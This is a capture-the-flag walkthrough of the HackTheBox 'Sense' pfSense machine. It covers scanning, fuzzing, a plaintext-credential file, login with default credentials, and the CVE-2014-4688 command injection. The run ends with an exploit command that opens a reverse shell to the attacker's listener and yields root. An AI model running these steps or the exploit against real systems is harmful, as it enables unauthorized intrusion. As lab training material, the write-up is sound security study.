
## Reconnaissance

### Port Scanning

Begin with port scanning via `nmap`:

**Full Scope →**

```bash
nmap -p- --max-rate 10000 sense.htb
```

![[HackTheBox/Sense/images/15.png]]

Ports 80 (HTTP) and 443 (HTTPS) are open.

**Service Scan →**

```bash
nmap -sV -p 80,443 sense.htb
```

![[HackTheBox/Sense/images/16.png]]

Both ports are running `lighttpd 1.4.35`.

**Vuln Scan →**

```bash
nmap --script=vuln -p 80,443 sense.htb
```

![[HackTheBox/Sense/images/17.png]]

The vuln script flags a potential Slowloris DoS vulnerability; no directly exploitable finding at this stage.

---

## Web Enumeration

### Directory Fuzzing

Start with `dirsearch` using the common wordlist:

```bash
dirsearch -u https://sense.htb -w /usr/share/dirb/wordlists/common.txt -t 50
```

![[HackTheBox/Sense/images/1.png]]

Results surface standard pfSense paths (`/classes`, `/css`, `/includes`, `/installer`, etc.) but nothing useful for authentication.

pfSense detects the custom hostname defined in `/etc/hosts` as a potential DNS rebinding attack and blocks access:

![[HackTheBox/Sense/images/14.png]]

Switching to the direct IP address (`10.129.3.2`) resolves this. Continue with `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u https://10.129.3.2/FUZZ -mc 200 -e .php,.aspx,.sh,.txt,.tar,.tar.gz
```

![[HackTheBox/Sense/images/3.png]]

The small wordlist returns only false positives pfSense redirects all unauthenticated requests to the login page, causing every response to share the same size (6690 bytes).

The lowercase variant yields the same result:

![[HackTheBox/Sense/images/4.png]]

Removing the status code filter and switching to the medium wordlist:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://10.129.3.2/FUZZ -e .php,.aspx,.sh,.txt,.tar,.tar.gz
```

![[HackTheBox/Sense/images/5.png]]

After a lengthy scan, two interesting files stand out: `changelog.txt` and `system-users.txt`.

### Sensitive File Discovery

**`changelog.txt`**: The security changelog reveals that the firewall update failed and only 2 out of 3 vulnerabilities have been patched:

![[HackTheBox/Sense/images/2.png]]

A direct hint that the system is intentionally left running a vulnerable version.

**`system-users.txt`**: A support ticket file containing plaintext credentials:

![[HackTheBox/Sense/images/7.png]]

Username: `Rohit`, password listed as "company defaults" which for pfSense means the default password: `pfsense`.

---

## Authentication

Navigate to the pfSense login panel at `https://10.129.3.2`. Logging in with `rohit:pfsense` (lowercase) is successful:

![[HackTheBox/Sense/images/8.png]]

The dashboard confirms the version as **pfSense 2.1.3-RELEASE**.

> **Note:** The `/csrf/` path found during fuzzing belongs to pfSense's CSRF token mechanism and returns 404 when accessed directly. The actual login page is at the root URL (`/`).

---

## Exploitation

### Vulnerability Research

```bash
searchsploit "pfsense 2.1.3"
```

![[HackTheBox/Sense/images/9.png]]

Searchsploit brings one result: **pfSense < 2.1.4 `status_rrd_graph_img.php` Command Injection (CVE-2014-4688)**. This is an authenticated RCE vulnerability where an unsanitized GET parameter in the RRD graph rendering endpoint allows injecting arbitrary OS commands.

The original ExploitDB script throws errors when executed:

![[HackTheBox/Sense/images/10.png]]

An updated, working version is available on GitHub:

[CVE-2014-4688 Exploit](https://github.com/jaydenblair/CVE-2014-4688-pfsense/blob/main/cve-2014-4688.py)

Review usage with:

```bash
python3 exp.py -h
```

Start a listener and run the exploit:

```bash
python3 exp.py --rhost 10.129.3.2 --lhost 10.10.14.79 --lport 1234 --username rohit --password pfsense
```

![[HackTheBox/Sense/images/11.png]]

The exploit fetches the CSRF token, injects the payload, and completes successfully.

### Shell

[Penelope](https://github.com/brightio/penelope) shell handler automatically upgrades the incoming connection to a PTY and delivers a `root` session:

![[HackTheBox/Sense/images/12.png]]

![[HackTheBox/Sense/images/13.png]]

No privilege escalation needed the exploit lands directly as root.

---

## Flags

```bash
cat /home/rohit/user.txt

cat /root/root.txt
```

---

*May The Pentest Be With You*
